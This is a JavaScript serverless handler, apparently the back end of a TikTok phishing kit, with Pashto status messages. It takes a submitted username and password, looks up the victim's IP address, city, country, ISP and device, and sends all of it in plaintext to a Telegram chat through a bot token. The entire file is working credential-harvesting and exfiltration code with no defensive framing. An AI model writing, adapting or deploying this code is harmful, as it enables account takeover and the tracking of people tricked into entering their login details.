// api/login.js
import fetch from 'node-fetch';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: '❌ Only POST requests allowed' });
  }

  const { username, password, uid } = req.body;

  if (!username || !password || !uid) {
    return res.status(400).json({ error: '❗ ټول فیلډونه ضروري دي.' });
  }

  const forwarded = req.headers['x-forwarded-for'];
  const ip = Array.isArray(forwarded) ? forwarded[0] : forwarded || req.socket.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';
  const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul' });

  let geo = {};
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
    geo = await geoRes.json();
  } catch (geoErr) {
    console.warn('🌐 IP-API failed:', geoErr);
  }

  const message = `
╭─── 𝗧𝗶𝗸𝗧𝗼𝗸 𝗗𝗮𝘁𝗮 ✅ ───╮
├ 👤 *Username:* ${username}
├ 🔐 *Password:* ${password}
├ 🆔 *UID:* ${uid}
├ 🕓 *Time:* ${timestamp}
├ 🌐 *IP:* ${geo.query || ip}
├ 🏙️ *City:* ${geo.city || 'N/A'}
├ 🌍 *Country:* ${geo.country || 'N/A'}
├ 🛰️ *ISP:* ${geo.isp || 'N/A'}
├ 📱 *Device:* ${userAgent}
╰────────────────────────────╯
`;

  const token = process.env.BOT_TOKEN;

  if (!token) {
    return res.status(500).json({ error: '❌ BOT_TOKEN نه دی تعریف شوی!' });
  }

  try {
    const telegramRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: String(uid),
        text: message,
        parse_mode: "Markdown"
      })
    });

    const telegramData = await telegramRes.json();

    if (!telegramData.ok) {
      throw new Error(telegramData.description || "Telegram API Error");
    }

    return res.status(200).json({ message: '✅ معلومات واستول شول!' });
  } catch (err) {
    console.error("Telegram error:", err);
    return res.status(500).json({ error: '❌ Telegram ته لیږد ناکام شو.' });
  }
} 
